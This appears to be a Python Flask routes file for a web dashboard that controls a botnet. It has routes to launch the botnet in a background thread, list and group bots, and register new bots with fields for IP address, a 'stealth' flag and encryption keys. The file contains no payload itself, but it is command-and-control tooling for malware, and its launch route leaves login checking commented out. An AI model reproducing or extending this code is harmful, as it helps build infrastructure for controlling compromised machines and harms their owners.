# -*- encoding: utf-8 -*-
"""
Copyright (c) 2019 - present AppSeed.us
"""

from apps.bot import blueprint
from flask import render_template, request
import threading

from action_botnet import launch
from apps.bot.models import Bots
from apps import db

@blueprint.route('/bot')
#@login_required
def bot_index():
    return render_template('home/bot/bot.html', segment='bot')

@blueprint.route('/bot/launch',methods=['GET', 'POST'])
def bot_launch():
        output = request.form.to_dict()
        name = output['name']

        thread_lancement = threading.Thread(target=launch.start_botnet)


        try :

            print("lancement botnet")
            thread_lancement.start()
            #launch.start_botnet(4242)

            print("fin")
            return render_template('home/bot/bot.html', segment='bot', name="lancement")
            ##launch.start_botnet(name, queue_web)

        except :
            return render_template('home/bot/bot.html', segment='bot', name="erreur")

        #return render_template('home/bot/bot.html', segment='bot', name=name)

@blueprint.route('/bot/list',methods=['GET', 'POST'])
def bot_list():
    bots_all = Bots.query.all()
    return render_template('home/bot/bot-list.html', segment='bot',bots=bots_all)

@blueprint.route('/bot/group',methods=['GET', 'POST'])
def bot_group():
    return render_template('home/bot/bot-group.html', segment='bot')

@blueprint.route('/bot/action',methods=['GET', 'POST'])
def bot_action():
    return render_template('home/bot/bot-action.html', segment='bot')

#bot manuel
@blueprint.route('/bot/add',methods=['GET', 'POST'])
def bot_add():
    if request.method == 'POST':
        output = request.form.to_dict()

        new_bot = Bots(
            uid=output['uid'],
            group_id=output['group_id'],
            stealth=output['stealth'],
            multi_thread=output['multi_thread'],
            ip=output['ip'],
            sym_key=output['sym_key'],
            pub_key=output['pub_key']
        )
        db.session.add(new_bot)
        db.session.commit()

    return render_template('home/bot/bot-add.html', segment='bot')
